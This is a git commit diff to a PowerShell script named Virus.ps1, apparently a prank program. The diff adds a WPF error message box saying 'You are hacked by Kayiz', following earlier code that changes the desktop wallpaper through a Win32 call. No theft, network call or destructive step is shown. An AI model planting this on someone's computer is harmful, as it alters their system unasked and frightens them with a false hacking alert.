528c8abe764fae49421d182d1247518aff9ad4fb
Kayiz-PT <74753555+Kayiz-PT@users.noreply.github.com>
2022-03-06 16:29:56 +0700

    Update Virus.ps1

--- Virus.ps1
+++ Virus.ps1
@@ -95,3 +95,9 @@ namespace Win32{
 
 add-type $code 
 [Win32.Wallpaper]::SetWallpaper($MyWallpaper)
+Add-Type -AssemblyName PresentationCore,PresentationFramework
+$ButtonType = [System.Windows.MessageBoxButton]::OK
+$MessageIcon = [System.Windows.MessageBoxImage]::Error
+$MessageBody = "You are hacked by Kayiz"
+$MessageTitle = "Alert !"
+$Result = [System.Windows.MessageBox]::Show($MessageBody,$MessageTitle,$ButtonType,$MessageIcon)
